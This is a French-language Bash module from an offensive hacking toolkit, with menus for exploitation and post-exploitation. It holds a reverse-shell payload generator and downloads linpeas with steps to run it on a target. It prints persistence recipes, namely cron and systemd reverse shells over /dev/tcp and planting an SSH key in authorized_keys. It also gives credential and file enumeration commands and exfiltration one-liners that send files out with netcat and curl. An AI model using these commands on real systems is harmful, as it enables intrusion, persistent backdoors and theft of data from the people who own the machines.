#!/bin/bash

# 🔥 EXPLOITATION & POST-EXPLOITATION MENU
exploitation_menu() {
    while true; do
        clear
        show_fox
        echo -e "${RED}🔥 EXPLOITATION & POST-EXPLOITATION${NC}"
        echo "=================================="
        
        echo -e "${GREEN}[1]${NC} 💣 Reverse Shell Generator"
        echo -e "${GREEN}[2]${NC} 🔐 Privilege Escalation Scanner"
        echo -e "${GREEN}[3]${NC} 🎭 Persistence & Backdoors"
        echo -e "${GREEN}[4]${NC} 📊 System Information Gathering"
        echo -e "${GREEN}[5]${NC} 🗝️ Password & Hash Cracking"
        echo -e "${GREEN}[6]${NC} 👤 Social Engineering Tools"
        echo -e "${GREEN}[7]${NC} 🔍 Post-Exploitation Enumeration"
        echo -e "${GREEN}[8]${NC} 💾 Data Exfiltration Tools"
        echo -e "${GREEN}[9]${NC} 🌐 Routersploit (Exploit Routeurs)"
        echo -e "${GREEN}[0]${NC} ← Retour au menu principal"
        echo ""
        read -r -p "🦊 Votre choix: " exploit_choice
        
        case $exploit_choice in
            1) reverse_shell_generator ;;
            2) privilege_escalation_scanner ;;
            3) persistence_backdoors ;;
            4) system_info_gathering ;;
            5) password_hash_cracking ;;
            6) social_engineering_menu ;;
            7) post_exploitation_enum ;;
            8) data_exfiltration_tools ;;
            9) run_routersploit ;;
            0) return ;;
            *)
                echo -e "${RED}❌ Option invalide${NC}"
                sleep 1
                ;;
        esac
    done
}

# 💣 REVERSE SHELL GENERATOR
reverse_shell_generator() {
    clear
    local suggested_lhost
    suggested_lhost=$(hostname -I | awk '{print $1}')
    
    echo -e "${RED}💣 REVERSE SHELL GENERATOR${NC}"
    echo "========================="
    
    echo -n -e "${YELLOW}🎯 IP d'écoute (LHOST) [défaut: $suggested_lhost]: ${NC}"
    read -r lhost
    if [[ -z "$lhost" ]]; then
        lhost="$suggested_lhost"
    fi

    echo -n -e "${YELLOW}🔌 Port d'écoute (LPORT) [défaut: 4444]: ${NC}"
    read -r lport
    if [[ -z "$lport" ]]; then
        lport="4444"
    fi
    
    if [[ -z "$lhost" || -z "$lport" ]]; then
        echo -e "${RED}❌ IP/Port requis${NC}"; sleep 2; return
    fi
    
    echo ""
    echo -e "${CYAN}📋 Choisissez votre payload:${NC}"
    echo -e "${GREEN}[1]${NC} 🐚 Bash"
    echo -e "${GREEN}[2]${NC} 🔗 Netcat"
    echo -e "${GREEN}[3]${NC} 🐍 Python 3"
    echo -e "${GREEN}[4]${NC} 🐘 PHP"
    echo -e "${GREEN}[5]${NC} 💎 Ruby"
    
    read -r -p "🦊 Payload: " payload_choice
    
    local payload_name=""
    local template_file=""

    case $payload_choice in
        1) payload_name="bash";;
        2) payload_name="netcat";;
        3) payload_name="python";;
        4) payload_name="php";;
        5) payload_name="ruby";;
        *)
            echo -e "${RED}❌ Option invalide !${NC}"; sleep 2; return
            ;;
    esac

    template_file="$SCRIPT_DIR/fox_lib/payload_templates/${payload_name}.tpl"

    if [[ ! -f "$template_file" ]]; then
        echo -e "${RED}❌ Fichier template introuvable !${NC}"; sleep 2; return
    fi

    # Générer le payload en utilisant sed pour remplacer les placeholders
    local payload_string
    payload_string=$(sed -e "s/LHOST/$lhost/g" -e "s/LPORT/$lport/g" "$template_file")

    echo -e "\n${YELLOW}Payload généré:${NC}\n$payload_string"
    
    # Sauvegarder le payload
    mkdir -p "$PIHACK_OUTPUT_PATH/exploits"
    local output_file="$PIHACK_OUTPUT_PATH/exploits/${payload_name}_shell_${lport}.txt"
    echo "$payload_string" > "$output_file"
    echo ""
    echo -e "${GREEN}✅ Payload sauvegardé dans: $output_file${NC}"

    echo ""
    echo -e "${GREEN}🎯 Pour écouter, utilisez cette commande dans un autre terminal:${NC}"
    echo -e "${CYAN}${BOLD}nc -lvnp $lport${NC}"
    echo ""
    
    read -r -p "Appuyez sur Entrée pour continuer..."
}

# 🔐 PRIVILEGE ESCALATION SCANNER
privilege_escalation_scanner() {
    local linpeas_url="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
    local tools_dir="$SCRIPT_DIR/tools"
    local linpeas_path="$tools_dir/linpeas.sh"

    clear
    show_fox
    echo -e "${RED}🔐 PRIVILEGE ESCALATION SCANNER (linpeas.sh)${NC}"
    echo "=============================================="

    # Vérifier si linpeas.sh existe, sinon le télécharger
    if [[ ! -f "$linpeas_path" ]]; then
        echo -e "${YELLOW}linpeas.sh non trouvé.${NC}"
        echo -e "${CYAN}🌀 Téléchargement depuis $linpeas_url...${NC}"
        mkdir -p "$tools_dir"
        if curl -sL "$linpeas_url" -o "$linpeas_path"; then
            chmod +x "$linpeas_path"
            echo -e "${GREEN}✅ Téléchargement et installation de linpeas.sh terminés.${NC}"
        else
            echo -e "${RED}❌ Échec du téléchargement. Veuillez vérifier votre connexion internet.${NC}"
            read -r -p "Appuyez sur Entrée pour continuer..."
            return
        fi
    else
        echo -e "${GREEN}✅ linpeas.sh est déjà présent dans $tools_dir${NC}"
    fi

    echo ""
    echo -e "${YELLOW}--- COMMENT UTILISER LINPEAS ---${NC}"
    echo "Linpeas doit être exécuté sur la machine CIBLE."
    echo ""
    echo -e "${CYAN}1. Démarrez un serveur web sur VOTRE machine pour héberger le script:${NC}"
    echo -e "   (Ouvrez un NOUVEAU terminal et exécutez cette commande)"
    echo -e "   ${GREEN}cd $tools_dir && python3 -m http.server 8000${NC}"
    echo ""
    
    local your_ip
    your_ip=$(hostname -I | awk '{print $1}')
    echo -e "${CYAN}2. Sur la machine CIBLE, téléchargez et exécutez le script:${NC}"
    echo -e "   (Vous avez besoin d'un shell sur la cible pour faire ça)"
    echo -e "   ${GREEN}wget http://$your_ip:8000/linpeas.sh -O /tmp/linpeas.sh${NC}"
    echo -e "   ${GREEN}chmod +x /tmp/linpeas.sh${NC}"
    echo -e "   ${GREEN}./tmp/linpeas.sh${NC}"
    echo ""
    echo -e "${YELLOW}Les résultats s'afficheront directement sur le terminal de la cible.${NC}"
    echo ""

    read -r -p "Appuyez sur Entrée pour revenir au menu..."
}

# 🎭 PERSISTENCE & BACKDOORS
persistence_backdoors() {
    clear
    show_fox
    echo -e "${RED}🎭 PERSISTENCE & BACKDOORS (GUIDE)${NC}"
    echo "======================================"
    echo -e "${YELLOW}La persistance consiste à maintenir l'accès à une machine compromise."
    echo -e "${YELLOW}Voici quelques techniques courantes. À exécuter sur la CIBLE.${NC}"
    echo ""

    echo -e "${CYAN}--- 1. Cron Job (Tâche planifiée) ---${NC}"
    echo "Crée une tâche qui exécute un reverse shell toutes les minutes."
    echo -e "   ${GREEN}(crontab -l 2>/dev/null; echo \"* * * * * /bin/bash -c 'bash -i >& /dev/tcp/VOTRE_IP/VOTRE_PORT 0>&1'\") | crontab -${NC}"
    echo ""

    echo -e "${CYAN}--- 2. Service Systemd ---${NC}"
    echo "Crée un service qui se lance au démarrage."
    echo -e "   a. Créez le fichier de service sur la cible : ${GREEN}nano /etc/systemd/system/revshell.service${NC}"
    echo -e "   b. Contenu du fichier (à adapter):"
    echo -e "      ${BOLD}[Unit]${NC}"
    echo -e "      Description=Reverse Shell
"
    echo -e "      ${BOLD}[Service]${NC}"
    echo -e "      ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/VOTRE_IP/VOTRE_PORT 0>&1'"
    echo -e "      Restart=always
"
    echo -e "      ${BOLD}[Install]${NC}"
    echo -e "      WantedBy=multi-user.target
"
    echo -e "   c. Activez et démarrez le service:"
    echo -e "      ${GREEN}sudo systemctl enable --now revshell.service${NC}"
    echo ""

    echo -e "${CYAN}--- 3. Ajout de clé SSH ---${NC}"
    echo "Ajoute votre clé publique SSH pour un accès direct."
    echo -e "   ${GREEN}echo \"VOTRE_CLE_PUBLIQUE_SSH\" >> /home/UTILISATEUR/.ssh/authorized_keys${NC}"
    echo ""

    read -r -p "Appuyez sur Entrée pour revenir au menu..."
}

# 🔍 POST-EXPLOITATION ENUMERATION
post_exploitation_enum() {
    clear
    show_fox
    echo -e "${RED}🔍 POST-EXPLOITATION ENUMERATION (GUIDE)${NC}"
    echo "==========================================="
    echo -e "${YELLOW}Une fois sur la cible, collectez un maximum d'informations.${NC}"
    echo ""

    echo -e "${CYAN}--- Informations Système ---${NC}"
    echo -e "   ${GREEN}uname -a${NC}              # Version du noyau"
    echo -e "   ${GREEN}ps aux${NC}                 # Processus en cours"
    echo -e "   ${GREEN}netstat -antup${NC}         # Connexions réseau"
    echo -e "   ${GREEN}cat /etc/passwd${NC}        # Liste des utilisateurs"
    echo -e "   ${GREEN}cat /etc/crontab${NC}       # Tâches planifiées système"
    echo ""

    echo -e "${CYAN}--- Informations Utilisateur ---${NC}"
    echo -e "   ${GREEN}whoami && id${NC}           # Qui suis-je ?"
    echo -e "   ${GREEN}sudo -l${NC}                # Droits sudo"
    echo -e "   ${GREEN}history${NC}                # Historique des commandes"
    echo -e "   ${GREEN}ls -la /home/*/.ssh/${NC}   # Chercher des clés SSH"
    echo ""

    echo -e "${CYAN}--- Recherche de Fichiers Intéressants ---${NC}"
    echo -e "   ${GREEN}find / -name '*.conf' -ls 2>/dev/null${NC}    # Fichiers de configuration"
    echo -e "   ${GREEN}find / -name '*.bak' -ls 2>/dev/null${NC}     # Fichiers de sauvegarde"
    echo -e "   ${GREEN}find /var/www -name '*.php' -ls 2>/dev/null${NC} # Fichiers web"
    echo ""

    read -r -p "Appuyez sur Entrée pour revenir au menu..."
}

# Alias pour le menu
system_info_gathering() {
    post_exploitation_enum
}

# Raccourci vers le menu de cracking
password_hash_cracking() {
    password_menu
}

# 💾 DATA EXFILTRATION TOOLS
data_exfiltration_tools() {
    clear
    show_fox
    echo -e "${RED}💾 DATA EXFILTRATION (GUIDE)${NC}"
    echo "=================================="
    echo -e "${YELLOW}Comment faire sortir des données d'une machine cible.${NC}"
    echo ""

    local your_ip
    your_ip=$(hostname -I | awk '{print $1}')

    echo -e "${CYAN}--- 1. Netcat (Fichier unique) ---${NC}"
    echo -e "   Sur VOTRE machine (écoute): ${GREEN}nc -lvnp 9001 > fichier_recu${NC}"
    echo -e "   Sur la CIBLE (envoi):     ${GREEN}nc $your_ip 9001 < /chemin/vers/le/fichier/secret${NC}"
    echo ""

    echo -e "${CYAN}--- 2. SCP (Secure Copy, si SSH est dispo) ---${NC}"
    echo -e "   Sur la CIBLE: ${GREEN}scp /chemin/vers/le/fichier/secret utilisateur@$your_ip:/chemin/local${NC}"
    echo ""

    echo -e "${CYAN}--- 3. Exfiltration via HTTP (dossier complet) ---${NC}"
    echo -e "   Sur la CIBLE: ${GREEN}tar -czf /tmp/archive.tar.gz /chemin/du/dossier/secret${NC}"
    echo -e "   Sur la CIBLE: ${GREEN}curl -X POST --data-binary @/tmp/archive.tar.gz http://$your_ip:8000${NC}"
    echo -e "   (Nécessite un serveur web qui écoute sur votre machine)"
    echo ""

    read -r -p "Appuyez sur Entrée pour revenir au menu..."
}

# ... (le reste du fichier reste un guide de référence et n'a pas besoin de modifications)
# ... (coller le reste du fichier ici) ...

# 🌐 ROUTERSPLOIT LAUNCHER
run_routersploit() {
    local rsf_path="${SCRIPT_DIR}/../tools/routersploit/rsf.py"
    if [[ ! -f "$rsf_path" ]]; then
        echo -e "${RED}❌ Routersploit non trouvé !${NC}"
        echo -e "${YELLOW}💡 Assurez-vous qu'il est cloné dans scripts/tools/routersploit${NC}"
        sleep 3; return
    fi
    clear
    echo -e "${CYAN}🚀 Lancement de Routersploit...${NC}"
    python3 "$rsf_path"
    press_enter_to_continue
}
